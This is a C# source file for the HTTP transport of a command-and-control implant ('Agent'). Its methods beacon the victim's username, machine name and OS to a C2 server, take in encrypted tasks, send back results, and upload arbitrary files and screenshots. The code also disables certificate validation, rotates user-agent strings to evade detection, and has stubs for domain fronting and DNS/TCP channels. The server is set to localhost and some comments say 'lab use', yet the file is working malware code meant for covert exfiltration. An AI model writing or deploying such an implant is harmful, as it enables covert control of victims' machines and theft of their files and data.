// HttpManager.cs
// Handles encrypted C2 communication (TLS/AES)

using System;
using System.Net.Http;
using System.Net;
using System.Text;
using Agent.Utils;
using System.IO;

namespace Agent
{
    public class HttpManager
    {
        private static readonly string c2Url = "https://localhost:5000";
        private static readonly string[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64)",
            "curl/7.55.1"
        };
        private static readonly Random random = new Random();
        private readonly string agentId;
        public HttpManager(string agentId) { this.agentId = agentId; }

        public string Beacon()
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.Add("User-Agent", userAgents[random.Next(userAgents.Length)]);
                    client.DefaultRequestHeaders.Add("X-Agent-ID", agentId);
                    string sysinfo = Environment.UserName + "@" + Environment.MachineName + "|" + Environment.OSVersion;
                    string enc = AESHelper.EncryptString(sysinfo);
                    var content = new StringContent(enc, Encoding.UTF8, "application/octet-stream");
                    var resp = client.PostAsync(c2Url + "/api/beacon", content).Result;
                    string encTask = resp.Content.ReadAsStringAsync().Result;
                    return string.IsNullOrWhiteSpace(encTask) ? null : AESHelper.DecryptString(encTask);
                }
            }
        }
        public void SendResult(string result)
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.Add("User-Agent", userAgents[random.Next(userAgents.Length)]);
                    client.DefaultRequestHeaders.Add("X-Agent-ID", agentId);
                    string enc = AESHelper.EncryptString(result);
                    var content = new StringContent(enc, Encoding.UTF8, "application/octet-stream");
                    client.PostAsync(c2Url + "/api/result", content).Wait();
                }
            }
        }
        public void UploadFile(string filePath)
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                using (var form = new MultipartFormDataContent())
                {
                    client.DefaultRequestHeaders.Add("User-Agent", userAgents[random.Next(userAgents.Length)]);
                    form.Add(new StringContent(agentId), "agent_id");
                    form.Add(new StreamContent(File.OpenRead(filePath)), "file", Path.GetFileName(filePath));
                    client.PostAsync(c2Url + "/api/upload", form).Wait();
                }
            }
        }
        public void UploadScreenshot(string filePath)
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                using (var form = new MultipartFormDataContent())
                {
                    client.DefaultRequestHeaders.Add("User-Agent", userAgents[random.Next(userAgents.Length)]);
                    form.Add(new StringContent(agentId), "agent_id");
                    form.Add(new StreamContent(File.OpenRead(filePath)), "screenshot", Path.GetFileName(filePath));
                    client.PostAsync(c2Url + "/api/screenshot", form).Wait();
                }
            }
        }

        // OPSEC: Domain fronting stub (lab use)
        private string GetFrontedUrl() => c2Url.Replace("127.0.0.1", "fronted-domain.com");

        // Transport: HTTP2 stub (lab use)
        public string BeaconHttp2()
        {
            // Implement HTTP2 beaconing here (stub)
            return Beacon();
        }
        // Transport: DNS/TCP stub (lab use)
        public string BeaconDnsTcp()
        {
            // Implement DNS/TCP beaconing here (stub)
            return Beacon();
        }
        public string BeaconHttp2Real()
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestVersion = new Version(2, 0); // HTTP2
                    client.DefaultRequestHeaders.Add("User-Agent", userAgents[random.Next(userAgents.Length)]);
                    var sysinfo = Environment.UserName + "@" + Environment.MachineName;
                    string enc = AESHelper.EncryptString(sysinfo);
                    var content = new StringContent(enc, Encoding.UTF8, "application/octet-stream");
                    var resp = client.PostAsync(c2Url, content).Result;
                    string encTask = resp.Content.ReadAsStringAsync().Result;
                    return AESHelper.DecryptString(encTask);
                }
            }
        }
    }
}
